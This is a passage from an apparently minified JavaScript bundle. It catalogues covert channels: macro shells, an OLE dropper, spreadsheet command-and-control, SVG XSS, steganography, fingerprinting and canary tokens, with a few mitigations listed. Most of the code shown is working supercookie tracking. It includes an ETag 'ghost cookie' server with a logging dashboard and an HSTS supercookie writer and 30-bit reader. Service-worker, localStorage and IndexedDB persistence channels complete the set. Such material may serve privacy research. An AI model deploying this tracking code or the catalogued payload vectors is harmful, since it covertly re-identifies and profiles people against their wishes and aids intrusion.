LSB",files:[{n:"bmp_embed.ts",l:"ts",id:"bmp-emb"},{n:"extract.ts",l:"ts",id:"bmp-ex"}]},{id:"mp3-id3",reg:"STG-010",name:".mp3 ID3",sub:"ID3v2 comment/APIC payload",cat:"STEGANOGRAPHY",proj:"Trojan",zone:"08",preview:"wave",vector:"write",persist:"high",cap:"arbitrary",mech:"ID3v2 frame injection",files:[{n:"inject.py",l:"py",id:"mp3-inject"},{n:"read.py",l:"py",id:"mp3-read"}]},{id:"mp4-meta",reg:"STG-011",name:".mp4 metadata",sub:"mp4 box atom injection",cat:"STEGANOGRAPHY",proj:"Trojan",zone:"08",preview:"code",vector:"write",persist:"high",cap:"arbitrary",mech:"udta box + free atom",files:[{n:"inject.py",l:"py",id:"mp4-inject"},{n:"read.py",l:"py",id:"mp4-read"}]},{id:"odt-macro",reg:"DOC-001",name:".odt macro",sub:"LibreOffice Basic payload",cat:"DOCUMENT",proj:"Macro",zone:"11",preview:"code",vector:"execute",persist:"v.high",cap:"full shell access",mech:"Shell() + UNO API",files:[{n:"Module1.xba",l:"xml",id:"xba-mod"},{n:"manifest.xml",l:"xml",id:"xba-man"},{n:"payload.odt",l:"bin",id:"xba-odt"}]},{id:"xba-persist",reg:"DOC-002",name:".xba module",sub:"persistent macro installer",cat:"DOCUMENT",proj:"Macro",zone:"11",preview:"code",vector:"write",persist:"v.high",cap:"startup execution",mech:"~/.config/libreoffice/.../Module1.xba",files:[{n:"installer.bas",l:"vb",id:"xba-inst"},{n:"beacon.bas",l:"vb",id:"xba-beacon"}]},{id:"svg-poly",reg:"DOC-003",name:"SVG polyglot",sub:"XSS + LibreOffice Draw doc",cat:"DOCUMENT",proj:"Favicon-Counter",zone:"11",preview:"svg",vector:"execute",persist:"none",cap:"XSS in browser context",mech:"<script> in SVG",files:[{n:"payload.svg",l:"xml",id:"svg-pay"},{n:"xss.js",l:"js",id:"svg-xss"}]},{id:"docx-ole",reg:"DOC-004",name:".docx OLE",sub:"dropper chain via OLE object",cat:"DOCUMENT",proj:"Trojan",zone:"11",preview:"code",vector:"execute",persist:"high",cap:"PE execution",mech:"OLE10Native embedding",files:[{n:"dropper.py",l:"py",id:"ole-drop"},{n:"manifest.xml",l:"xml",id:"ole-man"}]},{id:"xlsm-c2",reg:"DOC-005",name:".xlsm C2",sub:"spreadsheet command-and-control",cat:"DOCUMENT",proj:"Macro",zone:"11",preview:"code",vector:"execute",persist:"medium",cap:"remote shell via cells",mech:"WEBSERVICE() + Shell()",files:[{n:"C2Poll.bas",l:"vb",id:"xlsm-bas"},{n:"payload.xlsm",l:"bin",id:"xlsm-bin"}]},{id:"html-svg",reg:"DOC-006",name:"HTML SVG",sub:"image + script payload",cat:"DOCUMENT",proj:"Trojan",zone:"11",preview:"svg",vector:"execute",persist:"session",cap:"DOM exfil + XSS",mech:"<img src=svg> + onload",files:[{n:"host.html",l:"html",id:"hsvg-html"},{n:"payload.svg",l:"xml",id:"hsvg-svg"}]},{id:"html-srcset",reg:"DOC-007",name:"HTML srcset",sub:"responsive-image fingerprint",cat:"DOCUMENT",proj:"Trojan",zone:"11",preview:"code",vector:"passive",persist:"session",cap:"viewport + DPR",mech:"srcset selection probe",files:[{n:"probe.html",l:"html",id:"srcset-html"},{n:"analyze.py",l:"py",id:"srcset-an"}]},{id:"html-prefetch",reg:"DOC-008",name:"HTML prefetch",sub:"speculative load tracker",cat:"DOCUMENT",proj:"Trojan",zone:"11",preview:"code",vector:"passive",persist:"session",cap:"visited URL set",mech:"<link rel=prefetch>",files:[{n:"probe.html",l:"html",id:"pf-html"},{n:"server.js",l:"js",id:"pf-srv"}]},{id:"url-canary",reg:"CAN-001",name:"URL canary",sub:"click-triggered tracker",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"headers",vector:"passive",persist:"session",cap:"click + IP + UA",mech:"redirect beacon",files:[{n:"generate.ts",l:"ts",id:"uc-gen"},{n:"server.ts",l:"ts",id:"uc-srv"},{n:"TokenList.tsx",l:"tsx",id:"uc-ui"}]},{id:"dns-canary",reg:"CAN-002",name:"DNS canary",sub:"lookup-triggered detector",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"code",vector:"passive",persist:"session",cap:"DNS resolver + timestamp",mech:"unique subdomain lookup",files:[{n:"dns_server.py",l:"py",id:"dc-srv"},{n:"generate.py",l:"py",id:"dc-gen"}]},{id:"pdf-canary",reg:"CAN-003",name:".pdf canary",sub:"open-event detector",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"code",vector:"passive",persist:"session",cap:"open + app + IP",mech:"PDF /URI /AA action",files:[{n:"inject.py",l:"py",id:"pc-inject"},{n:"serve.py",l:"py",id:"pc-serve"}]},{id:"email-canary",reg:"CAN-004",name:"email canary",sub:"read-receipt pixel",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"pixel",vector:"passive",persist:"session",cap:"open + client + IP",mech:"img src in HTML email",files:[{n:"compose.py",l:"py",id:"ec-comp"},{n:"pixel.py",l:"py",id:"ec-px"}]},{id:"aws-key",reg:"CAN-005",name:"AWS key canary",sub:"fake credentials detector",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"code",vector:"passive",persist:"high",cap:"usage + region + IAM",mech:"CloudTrail + fake keys",files:[{n:"gen_keys.py",l:"py",id:"ak-gen"},{n:"trail_watcher.py",l:"py",id:"ak-watch"}]},{id:"sql-canary",reg:"CAN-006",name:"SQL canary",sub:"database exfil detector",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"code",vector:"passive",persist:"high",cap:"select + source",mech:"fake row with unique token",files:[{n:"seed.sql",l:"conf",id:"sq-seed"},{n:"watcher.py",l:"py",id:"sq-watch"}]},{id:"repo-clone",reg:"CAN-007",name:"repo clone canary",sub:"git clone detector",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"code",vector:"passive",persist:"high",cap:"remote + IP",mech:"git config + post-clone hook",files:[{n:"hook.sh",l:"conf",id:"rc-hook"},{n:"setup.sh",l:"conf",id:"rc-setup"}]},{id:"docx-canary",reg:"CAN-008",name:".docx canary",sub:"open-event detector",cat:"CANARY",proj:"Canary-CC",zone:"07",preview:"code",vector:"passive",persist:"session",cap:"open + user + IP",mech:"fieldsLINK + INCLUDEPICTURE",files:[{n:"inject.py",l:"py",id:"dcx-inj"},{n:"template.docx",l:"bin",id:"dcx-tpl"}]},{id:"headers",reg:"HTTP-001",name:"HTTP headers",sub:"CSP / HSTS / ETag / Cookie",cat:"HTTP",proj:"BSCA",zone:"01",preview:"headers",vector:"passive",persist:"varies",cap:"metadata exfil",mech:"response header manipulation",files:[{n:"nginx.conf",l:"conf",id:"hdr-nginx"},{n:"csp.js",l:"js",id:"hdr-csp"},{n:"analyze.py",l:"py",id:"hdr-an"}]},{id:"robots-trap",reg:"HTTP-002",name:"robots.txt",sub:"crawler behavior + trap",cat:"HTTP",proj:"FFF",zone:"01",preview:"code",vector:"passive",persist:"none",cap:"crawler fingerprint",mech:"Disallow: honeypot paths",files:[{n:"robots.txt",l:"txt",id:"rob-txt"},{n:"trap.js",l:"js",id:"rob-trap"}]},{id:"manifest-pwm",reg:"HTTP-003",name:"manifest.json",sub:"PWA config + scope lock",cat:"HTTP",proj:"BSCA",zone:"01",preview:"json",vector:"write",persist:"medium",cap:"install vector",mech:"Web App Manifest API",files:[{n:"manifest.json",l:"json",id:"mf-json"},{n:"sw.js",l:"js",id:"mf-sw"}]},{id:"wellknown",reg:"HTTP-004",name:".well-known",sub:"security / pki-validation",cat:"HTTP",proj:"FFF",zone:"01",preview:"code",vector:"passive",persist:"none",cap:"domain validation",mech:"RFC 8615 discovery",files:[{n:"security.txt",l:"txt",id:"wk-sec"},{n:"pki-validation",l:"txt",id:"wk-pki"}]},{id:"jwt-chan",reg:"HTTP-005",name:"JWT covert channel",sub:"payload-as-covert-channel",cat:"HTTP",proj:"FFF",zone:"01",preview:"code",vector:"write",persist:"session",cap:"arbitrary in claims",mech:"custom JWT claims + transport",files:[{n:"encode.ts",l:"ts",id:"jwt-enc"},{n:"decode.ts",l:"ts",id:"jwt-dec"}]},{id:"csp-report",reg:"HTTP-006",name:"CSP report-uri",sub:"violation beacon collector",cat:"HTTP",proj:"BSCA",zone:"01",preview:"headers",vector:"passive",persist:"session",cap:"violation + source",mech:"Content-Security-Policy-Report-Only",files:[{n:"policy.js",l:"js",id:"csp-pol"},{n:"collector.py",l:"py",id:"csp-coll"}]},{id:"content-type",reg:"HTTP-007",name:"Content-Type sniff",sub:"MIME confusion vector",cat:"HTTP",proj:"FFF",zone:"01",preview:"headers",vector:"passive",persist:"none",cap:"browser MIME guess",mech:"X-Content-Type-Options absent",files:[{n:"probe.html",l:"html",id:"ct-html"},{n:"analyze.py",l:"py",id:"ct-an"}]},{id:"cors-abuse",reg:"HTTP-008",name:"CORS abuse",sub:"credential cross-origin read",cat:"HTTP",proj:"BSCA",zone:"01",preview:"headers",vector:"passive",persist:"session",cap:"credential exfil",mech:"Access-Control-Allow-Origin: * + creds",files:[{n:"server.js",l:"js",id:"cors-srv"},{n:"probe.html",l:"html",id:"cors-html"}]},{id:"canvas-fp",reg:"FP-001",name:"canvas 2D",sub:"text rendering hash",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"canvas",vector:"passive",persist:"high",cap:"~8 entropy bits",mech:"toDataURL() hash",files:[{n:"probe.js",l:"js",id:"cv-probe"},{n:"hash.js",l:"js",id:"cv-hash"},{n:"collect.js",l:"js",id:"cv-coll"}]},{id:"webgl-fp",reg:"FP-002",name:"WebGL",sub:"GPU / driver fingerprint",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"high",cap:"~16 entropy bits",mech:"RENDERER + VENDOR strings",files:[{n:"webgl_probe.js",l:"js",id:"wg-probe"},{n:"extensions.js",l:"js",id:"wg-ext"}]},{id:"audio-fp",reg:"FP-003",name:"audio context",sub:"OfflineAudioContext hash",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"wave",vector:"passive",persist:"high",cap:"~8 entropy bits",mech:"oscillator Float32 sum",files:[{n:"audio_probe.js",l:"js",id:"au-probe"},{n:"worker.js",l:"js",id:"au-worker"}]},{id:"font-fp",reg:"FP-004",name:"font metrics",sub:"character width channel",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"high",cap:"~6 entropy bits",mech:"offsetWidth delta",files:[{n:"font_probe.js",l:"js",id:"ft-probe"},{n:"baseline.js",l:"js",id:"ft-base"}]},{id:"nav-fp",reg:"FP-005",name:"navigator",sub:"platform / UA / language",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"medium",cap:"~12 entropy bits",mech:"navigator.* properties",files:[{n:"nav_probe.js",l:"js",id:"nv-probe"},{n:"parse.js",l:"js",id:"nv-parse"}]},{id:"battery-fp",reg:"FP-006",name:"Battery API",sub:"level + charging time",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"session",cap:"~6 entropy bits",mech:"navigator.getBattery()",files:[{n:"probe.js",l:"js",id:"bt-probe"}]},{id:"sensor-fp",reg:"FP-007",name:"Sensor API",sub:"accelerometer / gyroscope",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"wave",vector:"passive",persist:"session",cap:"~8 entropy bits",mech:"DeviceSensorEvent + Sensor API",files:[{n:"probe.js",l:"js",id:"sn-probe"},{n:"analyze.js",l:"js",id:"sn-an"}]},{id:"pointer-fp",reg:"FP-008",name:"Pointer metrics",sub:"mouse / touch trajectory",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"session",cap:"~10 entropy bits",mech:"pointermove sampling",files:[{n:"probe.js",l:"js",id:"pt-probe"}]},{id:"timing-fp",reg:"FP-009",name:"Timing API",sub:"performance.now() resolution",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"high",cap:"~4 entropy bits",mech:"performance.now() + Date.now()",files:[{n:"probe.js",l:"js",id:"tm-probe"}]},{id:"storage-fp",reg:"FP-010",name:"Storage quota",sub:"quota estimation probe",cat:"FINGERPRINT",proj:"BSCA",zone:"31",preview:"code",vector:"passive",persist:"high",cap:"~6 entropy bits",mech:"navigator.storage.estimate()",files:[{n:"probe.js",l:"js",id:"st-probe"}]},{id:"ja3-fp",reg:"NET-001",name:"JA3/JA4",sub:"TLS client fingerprint",cat:"NETWORK",proj:"BSCA",zone:"02",preview:"headers",vector:"passive",persist:"high",cap:"~16 entropy bits",mech:"TLS ClientHello hash",files:[{n:"nginx_ja3.conf",l:"conf",id:"ja-conf"},{n:"parse_ja3.py",l:"py",id:"ja-py"}]},{id:"h2-fp",reg:"NET-002",name:"HTTP/2 SETTINGS",sub:"SETTINGS frame fingerprint",cat:"NETWORK",proj:"BSCA",zone:"02",preview:"code",vector:"passive",persist:"high",cap:"~8 entropy bits",mech:"h2 frame parameters",files:[{n:"h2_cap.py",l:"py",id:"h2-cap"},{n:"parse.py",l:"py",id:"h2-parse"}]},{id:"fav-timing",reg:"NET-003",name:"favicon timing",sub:"cache probe / timing attack",cat:"NETWORK",proj:"FFF",zone:"02",preview:"ico",vector:"passive",persist:"none",cap:"cache state bit",mech:"load event timing delta",files:[{n:"timing_probe.js",l:"js",id:"ft-probe2"},{n:"probe.html",l:"html",id:"ft-html"}]},{id:"webrtc-leak",reg:"NET-004",name:"WebRTC IP leak",sub:"local IP discovery",cat:"NETWORK",proj:"BSCA",zone:"02",preview:"code",vector:"passive",persist:"session",cap:"LAN + WAN IP",mech:"RTCPeerConnection ICE candidates",files:[{n:"probe.js",l:"js",id:"wr-probe"},{n:"stun.js",l:"js",id:"wr-stun"}]},{id:"quic-fp",reg:"NET-005",name:"QUIC fingerprint",sub:"HTTP/3 client fingerprint",cat:"NETWORK",proj:"BSCA",zone:"02",preview:"code",vector:"passive",persist:"high",cap:"~12 entropy bits",mech:"QUIC Initial packet parameters",files:[{n:"probe.js",l:"js",id:"qu-probe"},{n:"server.py",l:"py",id:"qu-srv"}]},{id:"doh-probe",reg:"NET-006",name:"DoH probe",sub:"DNS-over-HTTPS resolver detect",cat:"NETWORK",proj:"FFF",zone:"02",preview:"code",vector:"passive",persist:"high",cap:"resolver + DoH provider",mech:"DoH JSON API timing",files:[{n:"probe.js",l:"js",id:"doh-probe"},{n:"server.js",l:"js",id:"doh-srv"}]},{id:"h3-fp",reg:"NET-007",name:"HTTP/3 fingerprint",sub:"h3 settings + transport params",cat:"NETWORK",proj:"BSCA",zone:"02",preview:"code",vector:"passive",persist:"high",cap:"~8 entropy bits",mech:"h3 SETTINGS + QUIC TP",files:[{n:"probe.js",l:"js",id:"h3-probe"},{n:"parse.py",l:"py",id:"h3-parse"}]},{id:"ntp-net",reg:"NET-008",name:"NTP probe",sub:"clock-skew + latency detect",cat:"NETWORK",proj:"FFF",zone:"02",preview:"code",vector:"passive",persist:"high",cap:"clock skew + offset",mech:"NTPv4 packet round-trip",files:[{n:"probe.py",l:"py",id:"ntp-net-probe"},{n:"server.py",l:"py",id:"ntp-net-srv"}]},{id:"txt-zw",reg:"TXT-001",name:"zero-width",sub:"U+200B/C between cover chars",cat:"TEXT",proj:"STG",zone:"11",preview:"text",vector:"write",persist:"v.high",cap:"8 bit / cover char",mech:"ZWSP/ZWNJ runs",files:[{n:"encode.ts",l:"ts",id:"zw-enc"},{n:"decode.ts",l:"ts",id:"zw-dec"}],refs:["StegosaurusApp / text.ts"],mitigations:["strip U+200B–U+200F on ingest","render-normalize before storage"]},{id:"txt-homo",reg:"TXT-002",name:"homoglyph",sub:"Cyrillic/Greek lookalikes",cat:"TEXT",proj:"STG",zone:"11",preview:"text",vector:"write",persist:"v.high",cap:"1:1 substitution",mech:"codepoint lookalike map",files:[{n:"map.ts",l:"ts",id:"homo-map"},{n:"scan.ts",l:"ts",id:"homo-scan"}]},{id:"txt-tag",reg:"TXT-003",name:"tag block",sub:"U+E0000+ invisible metadata",cat:"TEXT",proj:"STG",zone:"11",preview:"text",vector:"write",persist:"v.high",cap:"12 bit / tag char",mech:"tag block codepoints",files:[{n:"embed.ts",l:"ts",id:"tag-emb"},{n:"strip.ts",l:"ts",id:"tag-strip"}]},{id:"txt-conf",reg:"TXT-004",name:"confusable ws",sub:"NBSP/EN-space/EM-space",cat:"TEXT",proj:"STG",zone:"11",preview:"text",vector:"write",persist:"v.high",cap:"1 bit / whitespace",mech:"space-type alternation",files:[{n:"ws.ts",l:"ts",id:"conf-ws"}]},{id:"txt-comb",reg:"TXT-005",name:"combining",sub:"U+0300/0301 overlay",cat:"TEXT",proj:"STG",zone:"11",preview:"text",vector:"write",persist:"high",cap:"2 state / base char",mech:"combining diacritic presence",files:[{n:"comb.ts",l:"ts",id:"comb-ts"}]},{id:"txt-bidi",reg:"TXT-006",name:"bidi override",sub:"U+202A/B/C controls",cat:"TEXT",proj:"STG",zone:"11",preview:"text",vector:"execute",persist:"medium",cap:"render-order abuse",mech:"bidi control runs",files:[{n:"bidi.ts",l:"ts",id:"bidi-ts"}],refs:["StegosaurusApp / text.ts"]},{id:"arc-zip",reg:"ARC-001",name:"ZIP extra field",sub:"arbitrary bytes in 0x5455",cat:"ARCHIVE",proj:"D",zone:"12",preview:"hex",vector:"write",persist:"v.high",cap:"unbounded",mech:"extra-field subblocks",files:[{n:"inject.py",l:"py",id:"arc-zip-inj"},{n:"walk.py",l:"py",id:"arc-zip-walk"}]},{id:"arc-epub",reg:"ARC-002",name:"EPUB zip-in-zip",sub:"nested container channel",cat:"ARCHIVE",proj:"D",zone:"12",preview:"hex",vector:"write",persist:"v.high",cap:"unbounded",mech:"nested PK signatures",files:[{n:"nest.py",l:"py",id:"arc-epub"}]},{id:"arc-tar",reg:"ARC-003",name:"TAR PAX header",sub:"PAX header smuggling",cat:"ARCHIVE",proj:"D",zone:"12",preview:"hex",vector:"write",persist:"high",cap:"~1 KB/entry",mech:"pax extended headers",files:[{n:"pax.py",l:"py",id:"arc-pax"}]},{id:"arc-iso",reg:"ARC-004",name:"ISO 9660",sub:"CD-image hidden track",cat:"ARCHIVE",proj:"D",zone:"12",preview:"hex",vector:"write",persist:"v.high",cap:"track-sized",mech:"Joliet/RockRidge dual files",files:[{n:"iso.py",l:"py",id:"arc-iso"}]},{id:"med-png",reg:"MED-001",name:"PNG text chunks",sub:"tEXt/zTXt/iTXt",cat:"MEDIA",proj:"D",zone:"13",preview:"hex",vector:"write",persist:"v.high",cap:"chunk-bounded",mech:"ancillary text chunks",files:[{n:"chunks.py",l:"py",id:"med-png-c"}]},{id:"med-exif",reg:"MED-002",name:"EXIF UserComment",sub:"EXIF field 0x9286",cat:"MEDIA",proj:"D",zone:"13",preview:"headers",vector:"write",persist:"v.high",cap:"~255 B",mech:"EXIF APP1 field",files:[{n:"exif.py",l:"py",id:"med-exif"}]},{id:"med-id3",reg:"MED-003",name:"MP3 ID3v2",sub:"TXXX user-defined frame",cat:"MEDIA",proj:"D",zone:"13",preview:"wave",vector:"write",persist:"v.high",cap:"frame-bounded",mech:"TXXX frames",files:[{n:"id3.py",l:"py",id:"med-id3"}]},{id:"med-svg",reg:"MED-004",name:"SVG metadata",sub:"RDF-embedded payload",cat:"MEDIA",proj:"D",zone:"13",preview:"svg",vector:"write",persist:"v.high",cap:"unbounded",mech:"<metadata> RDF block",files:[{n:"rdf.py",l:"py",id:"med-svg-r"}]},{id:"med-webp",reg:"MED-005",name:"WebP ICCP",sub:"ICC profile smuggling",cat:"MEDIA",proj:"D",zone:"13",preview:"hex",vector:"write",persist:"high",cap:"~16 KB",mech:"ICCP chunk",files:[{n:"iccp.py",l:"py",id:"med-iccp"}]},{id:"src-map",reg:"SRC-001",name:"sourcemap",sub:"//# sourceMappingURL=",cat:"SOURCE",proj:"D",zone:"14",preview:"code",vector:"write",persist:"medium",cap:"unbounded",mech:"map file sidecar",files:[{n:"map.js",l:"js",id:"src-map-js"}]},{id:"src-htmlc",reg:"SRC-002",name:"HTML comment",sub:"<!-- … --> storage",cat:"SOURCE",proj:"D",zone:"14",preview:"code",vector:"write",persist:"v.high",cap:"unbounded",mech:"comment nodes",files:[{n:"cmts.html",l:"html",id:"src-cmt"}]},{id:"src-data",reg:"SRC-003",name:"data-* attrs",sub:"semantic smuggling",cat:"SOURCE",proj:"D",zone:"14",preview:"code",vector:"write",persist:"high",cap:"attr-bounded",mech:"custom data attributes",files:[{n:"attrs.html",l:"html",id:"src-attr"}]},{id:"src-cssv",reg:"SRC-004",name:"CSS custom props",sub:"--var exfil",cat:"SOURCE",proj:"D",zone:"14",preview:"code",vector:"write",persist:"high",cap:"prop-bounded",mech:"custom property cascade",files:[{n:"props.css",l:"css",id:"src-css"}]},{id:"src-hooks",reg:"SRC-005",name:"pkg hooks",sub:"postinstall scripts",cat:"SOURCE",proj:"D",zone:"14",preview:"code",vector:"execute",persist:"medium",cap:"lifecycle hooks",mech:"npm lifecycle events",files:[{n:"hooks.json",l:"json",id:"src-hooks"}],mitigations:["audit pre/postinstall","--ignore-scripts"]}];new Map(cg.map(l=>[l.id,l]));const um={"etag-srv":`// favicon_rebel.js — ETag ghost cookie server
// REF: Favicon - Counter / Blueprint.txt
const http   = require('http');
const crypto = require('crypto');

// 16×16 transparent PNG — the innocent face
const ICON = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/' +
  '9hAAAABmJLR0QA/wD/AP+gvaeTAAAADUlEQVQ4y2Ng' +
  'YGBgAAAABQABXvMqGgAAAABJRU5ErkJggg==', 'base64'
);

const db = new Map();  // in-memory; use Redis in prod

http.createServer((req, res) => {
  const ip      = req.socket.remoteAddress;
  const ua      = req.headers['user-agent'] || '—';
  const ref     = req.headers['referer']    || '—';
  const incoming = req.headers['if-none-match'];

  // Resurrect identity from ghost cookie
  if (incoming) {
    const rec = db.get(incoming);
    if (rec) { rec.hits++; rec.last = Date.now(); }
    else db.set(incoming, { ip, ua, ref, hits: 1, ts: Date.now() });
  }

  const id = 'W/"' + crypto.randomUUID() + '"';
  db.set(id, { ip, ua, ref, hits: 0, ts: Date.now(), last: Date.now() });

  res.setHeader('ETag', id);
  res.setHeader('Cache-Control', 'max-age=31536000, immutable');
  res.setHeader('Content-Type', 'image/x-icon');
  res.writeHead(200);
  res.end(ICON);

}).listen(3000, () => {
  console.log('[rebel] :3000 — waiting for ghosts');
});`,"etag-mw":`// middleware/etag.js — reverse-proxy ETag stripper
// Strips ETag at the edge OR generates fresh per-request
module.exports = function etagMiddleware(req, res, next) {
  const incoming = req.headers['if-none-match'];
  if (incoming) {
    req._ghostCookie = incoming;
    delete req.headers['if-none-match'];
  }
  // Strip any upstream ETag so the browser can't pin a user
  res.removeHeader('ETag');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  next();
};`,"etag-log":`// logger.js — hit logger for ETag ghosts
const fs = require('fs');
const path = require('path');

const LOG = path.join(__dirname, '..', 'logs', 'ghost.log');

module.exports = function logHit(rec) {
  const line = JSON.stringify({
    ts: Date.now(), id: rec.id, ip: rec.ip,
    ua: rec.ua.slice(0, 64), ref: rec.ref.slice(0, 128),
  }) + '\\n';
  fs.appendFile(LOG, line, () => {});
};`,"etag-dash":`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>ETag Ghost — Tracking Log</title>
  <style>
    * { box-sizing: border-box; }
    body { background: #0e0c09; color: #cec0a4;
           font: 12px/1.5 monospace; padding: 20px; }
    h2   { color: #c87820; margin-bottom: 16px; font-size: 14px;
           letter-spacing: .1em; }
    table { border-collapse: collapse; width: 100%; }
    th   { color: #7a6848; font-size: 10px; text-align: left;
           padding: 4px 10px; border-bottom: 1px solid #2c2218; }
    td   { padding: 5px 10px; border-bottom: 1px solid #1f1b14; }
    .hit { color: #b82a20; }
    .new { color: #c87820; }
  </style>
</head>
<body>
  <h2>ETag / ghost-cookie log</h2>
  <div id="stats" style="color:#7a6848;font-size:10px;margin-bottom:12px"></div>
  <table>
    <thead><tr>
      <th>ETag (8)</th><th>IP</th><th>UA</th>
      <th>Referer</th><th>hits</th><th>last</th>
    </tr></thead>
    <tbody id="tbody"></tbody>
  </table>
  <script>
    async function refresh() {
      const rows = await fetch('/api/log').then(r => r.json());
      document.getElementById('stats').textContent =
        rows.length + ' identities tracked — refreshing every 5s';
      document.getElementById('tbody').innerHTML = rows.map(r => \`
        <tr>
          <td class="new">\${r.id.replace(/['"]/g,'').slice(0,8)}…</td>
          <td>\${r.ip}</td>
          <td>\${(r.ua||'').slice(0,36)}…</td>
          <td>\${(r.ref||'').slice(0,48)}</td>
          <td class="hit">\${r.hits}</td>
          <td>\${new Date(r.last).toISOString().slice(11,19)}</td>
        </tr>\`).join('');
    }
    refresh();
    setInterval(refresh, 5000);
  <\/script>
</body>
</html>`,"sw-main":`// sw.js — Service Worker as Cache API write channel
// BSCA Type: W | Phase: 2 | Persist: V.HIGH
const CACHE = '__bsca_ch';
const KEY   = '/__fp';

self.addEventListener('install',  e => e.waitUntil(self.skipWaiting()));
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

async function write(payload) {
  const cache = await caches.open(CACHE);
  await cache.put(KEY, new Response(JSON.stringify(payload)));
}

async function read() {
  const cache = await caches.open(CACHE);
  const res   = await cache.match(KEY);
  return res ? res.json() : null;
}

self.addEventListener('message', async ({ data, source }) => {
  if (data?.t === 'W') { await write(data.p); source.postMessage({ ok: true }); }
  if (data?.t === 'R') { source.postMessage({ v: await read() }); }
  if (data?.t === 'X') { const c = await caches.open(CACHE); await c.delete(KEY); }
});`,"sw-probe":`// probe.js — check whether SW channel is writable
export async function probe() {
  if (!('serviceWorker' in navigator)) return { ok:false, reason:'no SW' };
  const reg = await navigator.serviceWorker.register('/sw.js');
  await navigator.serviceWorker.ready;
  return new Promise(resolve => {
    const ch = new MessageChannel();
    ch.port1.onmessage = e => resolve({ ok:true, v:e.data.v });
    navigator.serviceWorker.controller.postMessage({ t:'R' }, [ch.port2]);
    setTimeout(() => resolve({ ok:false, reason:'timeout' }), 1500);
  });
}`,"sw-reg":`// register.js — SW registration + scope lock
if ('serviceWorker' in navigator) {
  navigator.serviceWorker.register('/sw.js', { scope: '/' })
    .then(reg => console.log('[sw] scope:', reg.scope))
    .catch(err => console.warn('[sw] failed:', err));
}`,"hsts-nginx":`# nginx.conf — HSTS supercookie writer
# BSCA Type: P | Phase: 0 | Persist: HIGH
# Per-client max-age encodes the identity bits

server {
  listen 443 ssl http2;
  server_name .target.example.com;

  # Issue unique max-age per IP — encode 5 bits per response
  location = /hsts-beacon {
    add_header Strict-Transport-Security
      "max-age=$arg_v; includeSubDomains; preload" always;
    add_header Cache-Control "no-store" always;
    add_header Content-Type  "image/gif" always;
    return 200 "";
  }

  # Reader: detect presence of HSTS by checking redirect behavior
  location = /hsts-probe {
    if ($scheme = http) {
      return 301 https://$host/hsts-probe;
    }
    add_header X-HSTS-State "locked" always;
    return 200 "locked\\n";
  }
}`,"hsts-probe":`<!DOCTYPE html>
<!-- hsts-probe.html — detect HSTS lock by HTTP→HTTPS redirect -->
<script>
  // Initial HTTP fetch — will be redirected if HSTS is locked
  fetch('http://target.example.com/hsts-probe', { redirect:'manual' })
    .then(r => {
      // type 'opaqueredirect' = HSTS lock present
      const locked = r.type === 'opaqueredirect';
      document.body.innerText = 'HSTS: ' + (locked ? 'LOCKED ✓' : 'absent ✗');
      navigator.sendBeacon('/fp/collect',
        JSON.stringify({ ts:Date.now(), type:'hsts', locked }));
    });
<\/script>`,"hsts-read":`// read.js — read HSTS state from JS
// 30 bits of identity encoded in max-age values
export async function readHSTS() {
  // Probe each bit-slot in parallel: if locked, the bit is 1
  const slots = await Promise.all(
    Array.from({length:30}, (_,i) => probeBit(i))
  );
  let id = 0n;
  slots.forEach((v, i) => { if (v) id |= (1n << BigInt(i)); });
  return { id: id.toString(16), bits: slots.filter(Boolean).length };
}

async function probeBit(bit) {
  // Attempt HTTP fetch to bit-URL — locked = true if auto-redirected
  try {
    const r = await fetch(\`http://bit-\${bit}.target.example.com/\`, {
      redirect:'manual', mode:'no-cors',
    });
    return r.type === 'opaqueredirect';
  } catch { return false; }
}`,"ls-write":`// write.js — localStorage persistent channel
// BSCA Type: W | Phase: 0 | Persist: HIGH | Cap: 5 MB
export function write(key, val) {
  try { localStorage.setItem('__mf_' + key, JSON.stringify(val)); }
  catch (e) { console.warn('[ls] quota', e); }
}`,"ls-read":`// read.js
export function read(key) {
  try {
    const v = localStorage.getItem('__mf_' + key);
    return v ? JSON.parse(v) : null;
  } catch { return null; }
}`,"ls-wipe":`// wipe.js — purge all __mf_ keys on logout
export function wipe() {
  for (let i = localStorage.length - 1; i >= 0; i--) {
    const k = localStorage.key(i);
    if (k?.startsWith('__mf_')) localStorage.removeItem(k);
  }
}`,"idb-chan-js":`// channel.js — IndexedDB structured channel
// BSCA Type: W | Phase: 1 | Persist: V.HIGH | Cap: 50+ MB
const DB = '__bsca_idb';
const STORE = 'kv';

function open() {
  return new Promise((res, rej) => {
    const r = indexedDB.open(DB, 1);
    r.onupgradeneeded = () => r.result.createObjectStore(STORE);
    r.onsuccess = () => res(r.result);
    r.onerror   = () => rej(r.error);
  });
}

export async function write(key, val) {
  const db = await open();
  return new Promise((res, rej) => {
    const tx = db.transaction(STORE, 'readwrite');
    tx.objectStore(STORE).put(val, key);
    tx.oncomplete = res;
    tx.onerror   = () => rej(tx.error);
  });
}

export async function read(key) {
  const db = await open();
  return new Promise((res, rej) => {
    const tx = db.transaction(STORE, 'readonly');
    const r  = tx.objectStore(STORE).get(key);
    r.onsuccess = () => res(r.result);
    r.onerror   = () => rej(r.error);
  });
}`,"idb-schema":`// schema.js — IDB schema migrations
